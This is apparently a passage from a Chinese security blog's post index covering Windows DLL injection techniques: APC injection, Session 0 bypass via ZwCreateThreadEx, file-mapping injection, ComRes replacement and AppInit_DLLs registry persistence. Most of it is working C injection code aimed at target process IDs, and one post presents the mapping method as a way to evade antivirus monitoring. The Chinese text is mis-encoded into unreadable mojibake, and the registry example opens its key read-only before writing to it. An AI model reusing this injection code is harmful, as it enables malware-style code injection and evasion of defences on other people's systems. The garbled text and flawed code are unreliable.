//å­˜å‚¨çº¿ç¨‹IDçš„åŠ¨æ€åˆ†é…æ•°ç»„ï¼Œé€šè¿‡è°ƒç”¨VirtualAllocåˆ†é…å†…å­˜ LPDWORD pThreadIdList = NULL; pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadIdList == NULL) &#123; printf(&quot;[*] Create Thread Id Space Error!\\n&quot;); return FALSE; &#125; RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD)); THREADENTRY32 te32 = &#123; 0 &#125;; RtlZeroMemory(&amp;te32, sizeof(te32)); te32.dwSize = sizeof(te32); //åˆ›å»ºç³»ç»Ÿä¸­æ‰€æœ‰çº¿ç¨‹çš„å¿«ç…§ HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (hThreadSnapshot == NULL) &#123; printf(&quot;[*] Create Thread Snap Error!\\n&quot;); return FALSE; &#125; //éå†çº¿ç¨‹å¿«ç…§ï¼Œè·å–æ¯ä¸ªçº¿ç¨‹çš„ä¿¡æ¯ã€‚ BOOL bRet = Thread32First(hThreadSnapshot, &amp;te32); while (bRet) &#123; //é€šè¿‡æ¯”è¾ƒçº¿ç¨‹æ‰€å±è¿›ç¨‹ID(th32OwnerProcessID)ä¸æŒ‡å®šè¿›ç¨‹ID(dwPid)åˆ¤æ–­æ˜¯å¦ä¸æŒ‡å®šè¿›ç¨‹åŒ¹é… if (te32.th32OwnerProcessID == dwPid) &#123; if (dwThreadIdListLength &gt;= dwThreadIdListMaxCount) &#123; break; &#125; //å¦‚æœåŒ¹é…ï¼Œåˆ™å°†çº¿ç¨‹ID te32.th32ThreadID æ·»åŠ åˆ°çº¿ç¨‹IDæ•°ç»„ä¸­ pThreadIdList[dwThreadIdListLength++] = te32.th32ThreadID; &#125; bRet = Thread32Next(hThreadSnapshot, &amp;te32); &#125; //å°†çº¿ç¨‹IDæ•°ç»„çš„é•¿åº¦ dwThreadIdListLength å’ŒæŒ‡é’ˆ pThreadIdList //åˆ†åˆ«èµ‹å€¼ç»™ä¼ å…¥çš„å‚æ•° pThreadIdListLength å’Œ ppThreadIdListï¼Œä»¥ä¾¿åœ¨å‡½æ•°å¤–éƒ¨è®¿é—®çº¿ç¨‹IDæ•°ç»„ã€‚ *pThreadIdListLength = dwThreadIdListLength; *ppThreadIdList = pThreadIdList; return TRUE;&#125;int main()&#123; //char szDllPath[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\x64\\\\Release\\\\Dll1.dll&quot;; char szDllPath[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\Debug\\\\Dll1&quot;; //è¿›ç¨‹pid DWORD dwPid = 28496 ; BOOL bRet; //æ‰€æœ‰çº¿ç¨‹id LPDWORD pThreadIdList = NULL; //çº¿ç¨‹idä¸ªæ•° DWORD dwThreadIdListLength = 0; //è·å–å½“å‰è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹ bRet = GetAllThreadIdByProcessId(dwPid, &amp;pThreadIdList, &amp;dwThreadIdListLength); if (!bRet) &#123; printf(&quot;[*] Get All Thread Id Error!\\n&quot;); return 0; &#125; // æ‰“å¼€è¿›ç¨‹ HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if (hProcess == NULL) &#123; printf(&quot;[*] Open Process Error!\\n&quot;); return 0; &#125; DWORD dwDllPathLen = strlen(szDllPath) + 1; // ç”³è¯·ç›®æ ‡è¿›ç¨‹ç©ºé—´ï¼Œç”¨äºå­˜å‚¨DLLè·¯å¾„ LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpBaseAddress == NULL) &#123; printf(&quot;[*] VirtualAllocEx Error!\\n&quot;); return 0; &#125; SIZE_T dwWriten = 0; // æŠŠDLLè·¯å¾„å­—ç¬¦ä¸²å†™å…¥ç›®æ ‡è¿›ç¨‹ WriteProcessMemory(hProcess, lpBaseAddress, szDllPath, dwDllPathLen, &amp;dwWriten); if (dwWriten != dwDllPathLen) &#123; printf(&quot;[*] Write Process Memory Error!\\n&quot;); return 0; &#125; //è·å–LoadLibraryAçš„åŠ è½½åœ°å€ LPVOID pLoadLibraryFunc = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if (pLoadLibraryFunc == NULL) &#123; printf(&quot;[*] Get Func Address Error!\\n&quot;); return 0; &#125; HANDLE hThread = NULL; // å€’åºæ’å…¥çº¿ç¨‹APCï¼Œå¯é¿å…å‡ºç°åœ¨æ’å…¥æ—¶è¿›ç¨‹å´©æºƒçš„ç°è±¡ for (int i = dwThreadIdListLength - 1; i &gt;= 0; i--) &#123; //çº¿ç¨‹å¥æŸ„ HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]); if (hThread) &#123; QueueUserAPC((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)lpBaseAddress); CloseHandle(hThread); hThread = NULL; &#125; &#125; printf(&quot; Success\\n&quot;); if (hProcess) &#123; CloseHandle(hProcess); hProcess = NULL; &#125; if (pThreadIdList) &#123; VirtualFree(pThreadIdList, 0, MEM_RELEASE); pThreadIdList = NULL; &#125; ExitProcess(0); return 0;&#125; è¿è¡Œç›®æ ‡æ³¨å…¥ç¨‹åº è¿è¡ŒDllæ³¨å…¥ç¨‹åº ç›®æ ‡è¿›ç¨‹å‡ºç°æµ‹è¯•Dll","categories":[{"name":"Dllæ³¨å…¥","slug":"Dllæ³¨å…¥","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"ç»•è¿‡Session0è¿›è¡Œæ³¨å…¥","slug":"çªç ´Session0çš„æ³¨å…¥","date":"2023-07-17T16:00:00.000Z","updated":"2024-05-12T13:10:06.100Z","comments":true,"path":"2023/07/18/çªç ´Session0çš„æ³¨å…¥/","permalink":"https://e1ectr0nlc.github.io/2023/07/18/%E7%AA%81%E7%A0%B4Session0%E7%9A%84%E6%B3%A8%E5%85%A5/","excerpt":"å¼•å…¥Sessionæ¦‚å¿µåï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡æ³¨å…¥æœåŠ¡è¿›ç¨‹æ¥å®ç°å¯ä¿¡ä»»è¿›ç¨‹æ³¨å…¥ã€‚å½“æˆ‘ä»¬å°è¯•æ³¨å…¥session0å½“ä¸­çš„è¿›ç¨‹é€šå¸¸ä¼šå¤±è´¥ï¼Œå°±æ˜¯å› ä¸ºæˆ‘ä»¬æ‰€å¤„çš„sessionä¸ç³»ç»ŸæœåŠ¡è¿›ç¨‹ä¸åœ¨åŒä¸€ä¸ªsessionå½“ä¸­ã€‚","text":"å¼•å…¥Sessionæ¦‚å¿µåï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡æ³¨å…¥æœåŠ¡è¿›ç¨‹æ¥å®ç°å¯ä¿¡ä»»è¿›ç¨‹æ³¨å…¥ã€‚å½“æˆ‘ä»¬å°è¯•æ³¨å…¥session0å½“ä¸­çš„è¿›ç¨‹é€šå¸¸ä¼šå¤±è´¥ï¼Œå°±æ˜¯å› ä¸ºæˆ‘ä»¬æ‰€å¤„çš„sessionä¸ç³»ç»ŸæœåŠ¡è¿›ç¨‹ä¸åœ¨åŒä¸€ä¸ªsessionå½“ä¸­ã€‚ æ¦‚å¿µâ€‹ é¦–å…ˆæ¥è§£é‡Šä¸€ä¸‹Sessionéš”ç¦»æœºåˆ¶ã€‚åœ¨Windows XPã€Windows Server 2003ï¼Œä»¥åŠæ›´è€ç‰ˆæœ¬çš„Windowsæ“ä½œç³»ç»Ÿä¸­ï¼ŒæœåŠ¡å’Œåº”ç”¨ç¨‹åºä½¿ç”¨ç›¸åŒçš„ä¼šè¯ï¼ˆSESSIONï¼‰æ¥è¿è¡Œï¼Œè€Œè¿™ä¸ªä¼šè¯æ˜¯ç”±ç¬¬ä¸€ä¸ªç™»å½•åˆ°æ§åˆ¶å°çš„ç”¨æˆ·æ¥å¯åŠ¨çš„ï¼Œè¯¥ä¼šè¯å°±ç§°ä¸ºSESSION 0ã€‚å°†æœåŠ¡å’Œç”¨æˆ·åº”ç”¨ç¨‹åºä¸€èµ·åœ¨SESSION 0ä¸­è¿è¡Œä¼šå¯¼è‡´å®‰å…¨é£é™©ï¼Œå› ä¸ºæœåŠ¡ä¼šä½¿ç”¨æå‡åçš„æƒé™æ¥è¿è¡Œï¼Œè€Œç”¨æˆ·åº”ç”¨ç¨‹åºä½¿ç”¨ç”¨æˆ·ç‰¹æƒï¼ˆå¤§éƒ¨åˆ†éƒ½æ˜¯éç®¡ç†å‘˜ç”¨æˆ·ï¼‰è¿è¡Œï¼Œè¿™ä¼šä½¿å¾—æ¶æ„è½¯ä»¶æŠŠæŸä¸ªæœåŠ¡ä½œä¸ºæ”»å‡»ç›®æ ‡ï¼Œé€šè¿‡â€œåŠ«æŒâ€è¯¥æœåŠ¡ä»¥è¾¾åˆ°æå‡è‡ªå·±æƒé™çº§åˆ«çš„ç›®çš„ã€‚ â€‹ ä»Windows VISTAå¼€å§‹ï¼Œåªæœ‰æœåŠ¡å¯ä»¥æ‰˜ç®¡åˆ°SESSION 0ä¸­ï¼Œç”¨æˆ·åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ä¹‹é—´ä¼šè¿›è¡Œéš”ç¦»ï¼Œå¹¶éœ€è¦è¿è¡Œåœ¨ç”¨æˆ·ç™»å½•ç³»ç»Ÿæ—¶åˆ›å»ºçš„åç»­ä¼šè¯ä¸­ã€‚å¦‚ç¬¬ä¸€ä¸ªç™»å½•ç”¨æˆ·åˆ›å»ºSession 1ï¼Œç¬¬äºŒä¸ªç™»å½•ç”¨æˆ·åˆ›å»ºSession 2ï¼Œä»¥æ­¤ç±»æ¨ã€‚ â€‹ æˆ‘ä»¬ä½¿ç”¨CreatRemoteThreadåœ¨æ™®é€šç”¨æˆ·è¿›ç¨‹æ³¨å…¥shellcodeæˆ–è€…Dllæ²¡é—®é¢˜ï¼Œä½†æ˜¯æƒ³è¦æ›´è¿›ä¸€æ­¥æ³¨å…¥åˆ°ç³»ç»Ÿè¿›ç¨‹ä¸­ï¼Œé‚£ä¹ˆå°±ä¸€å®šä¼šå¤±è´¥ï¼Œå°±æ˜¯ç”±äºSession 0éš”ç¦»çš„ç¼˜æ•…ã€‚æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ å®ç°æ–¹æ³•â€‹ å¼•å…¥Sessionéš”ç¦»æœºåˆ¶åï¼Œä½¿ç”¨CreateRemoteThreadåˆ›å»ºè¿œç¨‹çº¿ç¨‹æ—¶çº¿ç¨‹å…ˆæŒ‚èµ·ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦è¿è¡Œåœ¨æ‰€å±ä¼šè¯å±‚åå†å†³å®šæ˜¯å¦æ¢å¤è¿è¡Œã€‚ â€‹ ZwCreateThreadExå‡½æ•°æ¯”CreateRemoteThreadå‡½æ•°æ›´æ¥è¿‘å†…æ ¸ï¼ŒCreateRemoteThreadæœ€ç»ˆä¹Ÿæ˜¯è°ƒç”¨ZwCreateThreadExå‡½æ•°æ¥åˆ›å»ºçº¿ç¨‹çš„ï¼Œé€šè¿‡å‰äººå¯¹CreateRemoteThreadé€†å‘ç ”ç©¶å‘ç°ï¼Œåœ¨å†…éƒ¨è°ƒZwCreateThreadExä¼šæŠŠç¬¬ä¸ƒä¸ªå‚æ•°åˆ›å»ºæ ‡è¯†è®¾ç½®ä¸º1ï¼Œè¿™æ ·ä¼šä½¿åœ¨ç³»ç»ŸæœåŠ¡åˆ›å»ºçš„çº¿ç¨‹æŒ‚èµ·ï¼Œè¿™ä¹Ÿæ˜¯æ³¨å…¥å¤±è´¥çš„åŸå› ã€‚ â€‹ åªè¦ä½ å­¦è¿‡è¿œç¨‹çº¿ç¨‹æ³¨å…¥å°±æ˜ç™½è¿™ä¸ªæŠ€æœ¯çš„å®ç°è¿‡ç¨‹ï¼Œåªæ˜¯å°†CreateRemoteThreadæ¢æˆäº†ZwCreateThreadExã€‚ ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;//ZwCreateThreadExçš„32ä½å’Œ64ä½å®šä¹‰#ifdef _WIN64typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#elsetypedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endiftypedef DWORD(WINAPI* typedef_LoadLibraryA)(char* path);int main() &#123; //x64DLLè·¯å¾„ char DllPath[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\x64\\\\Release\\\\Dll1.dll&quot;; //x32 //char DllPath[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\Debug\\\\Dll1.dll&quot;; DWORD dwPid = 28496 ; HANDLE hRemoteThread; HMODULE hNtModule = GetModuleHandleA(&quot;ntdll.dll&quot;); HMODULE hKeModule = GetModuleHandleA(&quot;Kernel32.dll&quot;); typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtModule, &quot;ZwCreateThreadEx&quot;); typedef_LoadLibraryA myLoadLibraryA = (typedef_LoadLibraryA)GetProcAddress(hKeModule, &quot;LoadLibraryA&quot;); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,dwPid); LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, sizeof(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(hProcess, lpBaseAddress, DllPath, sizeof(DllPath), 0); ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)myLoadLibraryA, lpBaseAddress, 0, 0, 0, 0, NULL); CloseHandle(hRemoteThread); CloseHandle(hProcess); FreeLibrary(hKeModule); FreeLibrary(hNtModule); return 0;&#125;","categories":[{"name":"Dllæ³¨å…¥","slug":"Dllæ³¨å…¥","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"æ˜ å°„æ³¨å…¥","slug":"æ˜ å°„æ³¨å…¥","date":"2023-07-15T16:00:00.000Z","updated":"2024-05-12T13:10:28.495Z","comments":true,"path":"2023/07/16/æ˜ å°„æ³¨å…¥/","permalink":"https://e1ectr0nlc.github.io/2023/07/16/%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5/","excerpt":"æ˜ å°„æ³¨å…¥å®é™…ä¸Šçš„æ€è·¯ä¸è¿œç¨‹çº¿ç¨‹æ³¨å…¥ä¸€è‡´ï¼Œåªä¸è¿‡æ˜ å°„æ³¨å…¥æ”¹å˜äº†Dllçš„å†™å…¥æ–¹å¼è€Œå·²ã€‚","text":"æ˜ å°„æ³¨å…¥å®é™…ä¸Šçš„æ€è·¯ä¸è¿œç¨‹çº¿ç¨‹æ³¨å…¥ä¸€è‡´ï¼Œåªä¸è¿‡æ˜ å°„æ³¨å…¥æ”¹å˜äº†Dllçš„å†™å…¥æ–¹å¼è€Œå·²ã€‚ æ¦‚å¿µæ˜ å°„æ³¨å…¥æ˜¯ä¸€ç§å†…å­˜æ³¨å…¥æŠ€æœ¯ï¼Œåˆ›å»ºçš„Mappingå¯¹è±¡æœ¬è´¨ä¸Šå±äºç”³è¯·ä¸€å—ç‰©ç†å†…å­˜ï¼Œè€Œç‰©ç†å†…å­˜åˆèƒ½æ¯”è¾ƒæ–¹ä¾¿çš„é€šè¿‡ç³»ç»Ÿå‡½æ•°ç›´æ¥æ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ä¸­ï¼Œå°±é¿å…ä½¿ç”¨ä¸€äº›ç»å…¸å‡½æ•°ä¾‹å¦‚VirtualAllocEx,WriteProcessMemoryç­‰è¢«æ€æ¯’è½¯ä»¶ä¸¥å¯†ç›‘æ§çš„APIã€‚ å®ç°æ€è·¯åœ¨æ³¨å…¥è¿›ç¨‹åˆ›å»ºmappingå¯¹è±¡ï¼Œå‘è¢«æ˜ å°„çš„è™šæ‹Ÿåœ°å€ç©ºé—´å†™å…¥shellcodeï¼Œæ‰“å¼€è¢«æ³¨å…¥çš„è¿›ç¨‹å¥æŸ„ï¼Œå°†mappingæ˜ å°„åˆ°è¢«æ³¨å…¥è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ï¼Œåˆ›å»ºè¿œç¨‹çº¿ç¨‹è°ƒç”¨ã€‚ ä»£ç å®ç°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include&lt;string.h&gt;#pragma comment(lib, &quot;OneCore.lib&quot;)// DLL pathconst char* dllPath = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\Debug\\\\Dll1.dll&quot;;//const char* dllPath = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\x64\\\\Release\\\\Dll1.dll&quot;;DWORD pid = 37836;int main()&#123; // æ‰“å¼€ç›®æ ‡ç¨‹åº HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (!hProcess) &#123; printf(&quot;ç›®æ ‡è¿›ç¨‹æ‰“å¼€å¤±è´¥. Error code: %d\\n&quot;, GetLastError()); return -1; &#125; //åˆ›å»ºdllè·¯å¾„çš„æ˜ å°„å¯¹è±¡ HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, strlen(dllPath) + 1, NULL); if (!hMapping) &#123; printf(&quot;åˆ›å»ºå¤±è´¥. Error code: %d\\n&quot;, GetLastError()); CloseHandle(hProcess); return -1; &#125; // å°†æ–‡ä»¶æ˜ å°„åˆ°å½“å‰è¿›ç¨‹ LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, strlen(dllPath) + 1); if (!lpMapAddress) &#123; printf(&quot;æ˜ å°„å¤±è´¥. Error code: %d\\n&quot;, GetLastError()); CloseHandle(hMapping); CloseHandle(hProcess); return -1; &#125; // å°†dllè·¯å¾„å†™å…¥æ˜ å°„å†…å­˜ strcpy((char*)lpMapAddress, dllPath); // ç›®æ ‡è¿›ç¨‹ä¸­è·å–loadlibraryçš„è·¯å¾„ LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if (!pLoadLibraryA) &#123; printf(&quot;è·å–LoadLibraryAå‡½æ•°å¤±è´¥. Error code: %d\\n&quot;, GetLastError()); UnmapViewOfFile(lpMapAddress); CloseHandle(hMapping); CloseHandle(hProcess); return -1; &#125; // å°†æ–‡ä»¶æ˜ å°„æ˜ å°„åˆ°è¿œç¨‹è¿›ç¨‹ LPVOID lpRemoteMapAddress = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_READWRITE); if (!lpRemoteMapAddress) &#123; printf(&quot;Failed to map view of file in the target process. Error code: %d\\n&quot;, GetLastError()); UnmapViewOfFile(lpMapAddress); CloseHandle(hMapping); CloseHandle(hProcess); return -1; &#125; // åˆ›å»ºè¿œç¨‹çº¿ç¨‹è°ƒç”¨loadlibraryå‡½æ•°å»åŠ è½½dll HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, lpRemoteMapAddress, 0, NULL); if (!hRemoteThread) &#123; printf(&quot;Failed to create a remote thread in the target process. Error code: %d\\n&quot;, GetLastError()); UnmapViewOfFile(lpRemoteMapAddress); UnmapViewOfFile(lpMapAddress); CloseHandle(hMapping); CloseHandle(hProcess); return -1; &#125; // ç­‰å¾…çº¿ç¨‹è¿è¡Œç»“æŸ WaitForSingleObject(hRemoteThread, INFINITE); // Cleanup CloseHandle(hRemoteThread); UnmapViewOfFile(lpRemoteMapAddress); UnmapViewOfFile(lpMapAddress); CloseHandle(hMapping); CloseHandle(hProcess); return 0;&#125;","categories":[{"name":"Dllæ³¨å…¥","slug":"Dllæ³¨å…¥","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"ComResæ³¨å…¥","slug":"COMResæ³¨å…¥","date":"2023-07-12T16:00:00.000Z","updated":"2024-05-12T13:21:47.101Z","comments":true,"path":"2023/07/13/COMResæ³¨å…¥/","permalink":"https://e1ectr0nlc.github.io/2023/07/13/COMRes%E6%B3%A8%E5%85%A5/","excerpt":"å­¦ä¹ ä¸‹æ¥æ„Ÿè§‰æ˜¯ä¸€ä¸ªç”¨å¤„ä¸å¤§ã€é€‚ç”¨æ€§å¾ˆçª„çš„ä¸€ç§æ³¨å…¥æ‰‹æ³•ã€‚","text":"å­¦ä¹ ä¸‹æ¥æ„Ÿè§‰æ˜¯ä¸€ä¸ªç”¨å¤„ä¸å¤§ã€é€‚ç”¨æ€§å¾ˆçª„çš„ä¸€ç§æ³¨å…¥æ‰‹æ³•ã€‚ æ¦‚å¿µå½“è¢«æ³¨å…¥ç¨‹åºä½¿ç”¨CoCreateInstance()è¿™ä¸ªAPIæ—¶ï¼ŒComæœåŠ¡å™¨ä¼šåŠ è½½ComRes.dllåˆ°è¢«æ³¨å…¥ç¨‹åºä¸­ã€‚åªè¦æˆ‘ä»¬æ›¿æ¢æ‰è¿™ä¸ªComRes.dllæ–‡ä»¶ï¼Œå°±å¯ä»¥å®ç°æ³¨å…¥ã€‚ComRes.dllä½äºWindows ç³»ç»Ÿä¸­C:\\WINDOWS\\system32ç›®å½•ä¸‹ã€‚ é™åˆ¶æˆ‘ä»¬å¾ˆå®¹æ˜“å°±èƒ½çœ‹å‡ºè¿™ç§æ³¨å…¥æ–¹æ³•çš„é™åˆ¶ï¼Œåªèƒ½å¯¹è°ƒç”¨CoCreateInstance()çš„ç¨‹åºè¿›è¡Œæ³¨å…¥ï¼Œæ³›ç”¨æ€§ä¸é«˜ã€‚å¹¶ä¸”å½“ç¨‹åºåŠ è½½è¿‡comRes.dllæ–‡ä»¶åï¼Œå†è¿›è¡Œæ›¿æ¢ä¹Ÿä¼šå¤±æ•ˆï¼Œæ³¨å…¥æ—¶æœºä¹Ÿå¾ˆé‡è¦ã€‚ å®ç°æ€è·¯ç¼–å†™ä¼ªé€ Dllæ–‡ä»¶æ›¿æ¢åŸæ–‡ä»¶ ä»£ç å®ç°æ²¡æœ‰ä»£ç å®ç°ï¼Œæ›¿æ¢ä¸ªæ–‡ä»¶å°±ä¸éœ€è¦å†™ä»£ç äº†å§(ğŸ˜€ç¬‘)","categories":[{"name":"Dllæ³¨å…¥","slug":"Dllæ³¨å…¥","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"æ³¨å†Œè¡¨æ³¨å…¥","slug":"æ³¨å†Œè¡¨æ³¨å…¥","date":"2023-07-12T16:00:00.000Z","updated":"2024-05-12T13:21:43.668Z","comments":true,"path":"2023/07/13/æ³¨å†Œè¡¨æ³¨å…¥/","permalink":"https://e1ectr0nlc.github.io/2023/07/13/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/","excerpt":"è¯´å®è¯ï¼Œæ³¨å†Œè¡¨æ˜¯æ€è½¯ä¸¥å¯†ç›‘è§†çš„åœ°æ–¹ï¼Œæˆ‘è§‰å¾—ç°åœ¨å¯¹æ³¨å†Œè¡¨è¿›è¡Œçš„æ“ä½œåæœ‰å…«ä¹éƒ½ä¼šè¢«æŸ¥å‡ºæ¥ï¼ˆä½†æŠ€æœ¯è¿˜æ˜¯è¦å­¦çš„ï¼‰ã€‚","text":"è¯´å®è¯ï¼Œæ³¨å†Œè¡¨æ˜¯æ€è½¯ä¸¥å¯†ç›‘è§†çš„åœ°æ–¹ï¼Œæˆ‘è§‰å¾—ç°åœ¨å¯¹æ³¨å†Œè¡¨è¿›è¡Œçš„æ“ä½œåæœ‰å…«ä¹éƒ½ä¼šè¢«æŸ¥å‡ºæ¥ï¼ˆä½†æŠ€æœ¯è¿˜æ˜¯è¦å­¦çš„ï¼‰ã€‚ æ¦‚å¿µä¸»è¦ä¾èµ–äºä¸¤ä¸ªè¡¨é¡¹ï¼ŒAppInit_Dllså’ŒLoadAppInit_DLLsã€‚AppInit_Dllså†™å…¥dllå®Œæ•´è·¯å¾„ï¼ŒLoadAppInit_DLLså†™ä¸º1ï¼Œé‡å¯åï¼ŒæŒ‡å®šDLLä¼šæ³¨å…¥åˆ°æ‰€æœ‰è¿è¡Œè¿›ç¨‹ã€‚User32.dllåœ¨è¢«åŠ è½½åˆ°è¿›ç¨‹æ—¶ï¼Œä¼šè¯»å–AppInit_Dllsè¡¨é¡¹ã€‚è‹¥æœ‰å€¼ï¼Œä¼šè°ƒç”¨LoadLibraryæ¥è½½å…¥è¿™ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„æ¯ä¸ªDLLã€‚æ‰€ä»¥æ³¨å†Œè¡¨æ³¨å…¥åªå¯¹åŠ è½½user32.dllçš„è¿›ç¨‹æœ‰æ•ˆã€‚ å®ç°æ€è·¯è¯´å®è¯è¿™ç§æ–¹æ³•çš„æ€è·¯ä¹Ÿæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç”šè‡³ä¸éœ€è¦ç¼–å†™ç¨‹åºå°±å¯ä»¥å®ç°ã€‚ æ‰“å¼€æ³¨å†Œè¡¨é”®å€¼å¦‚ä¸‹ï¼šHKEY_LOCAL_MACHINE\\SoftWare\\MicroSoft\\Windows NT\\CurrentVersion\\Windows\\ï¼› åœ¨ä¸Šé¢çš„æ³¨å†Œè¡¨é¡¹ä¸­æ“ä½œ AppInit_DLLs é”®å€¼ï¼Œåœ¨è¯¥é”®å€¼ä¸­æ·»åŠ è‡ªå·±çš„DLLçš„å…¨è·¯å¾„åŠ dllåï¼Œå¤šä¸ªDLLä»¥é€—å·æˆ–è€…ç©ºæ ¼åˆ†å¼€ï¼› åœ¨è¯¥æ³¨å†Œè¡¨é¡¹ä¸­æ·»åŠ é”®å€¼LoadAppInit_DLLsï¼Œç±»å‹ä¸º DWORDï¼Œå¹¶å°†å…¶å€¼ç½®ä¸º 1 ã€‚ ä»£ç å®ç°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; HKEY hKey; char csAppInitValue[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\x64\\\\Release\\\\Dll1.dll&quot;; DWORD dwLoadAppInitValue = 1; char csSubKey[] = &quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\\\&quot;; //æ‰“å¼€æ³¨å†Œè¡¨ LSTATUS lsRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&quot;, 0, KEY_READ, &amp;hKey); if (lsRet != ERROR_SUCCESS) &#123; printf(&quot;Open Key Failed....\\n&quot;); return -1; &#125; char csBuf[100] = &quot;&quot;; DWORD dwSize = 100; DWORD dwType = 0; RegQueryValueExA(hKey, &quot;AppInit_DLLs&quot;, 0, &amp;dwType, (LPBYTE)csBuf, &amp;dwSize); int nSize = strlen(csAppInitValue); //æ·»åŠ Dllè·¯å¾„ lsRet = RegSetValueExA(hKey, &quot;AppInit_DLLs&quot;, 0, REG_SZ, (const BYTE *)csAppInitValue, nSize + 1); if (lsRet != ERROR_SUCCESS) &#123; printf(&quot;Set Key Failed1....\\n&quot;); return -1; &#125; //å°†LoadAppInit_DLLsè®¾ä¸º1 lsRet = RegSetValueExA(hKey, &quot;LoadAppInit_DLLs&quot;, 0, REG_DWORD, (const BYTE *)&amp;dwLoadAppInitValue, sizeof(DWORD)); if (lsRet != ERROR_SUCCESS) &#123; printf(&quot;Set Key Failed2....\\n&quot;); return -1; &#125; RegCloseKey(hKey); getchar(); return 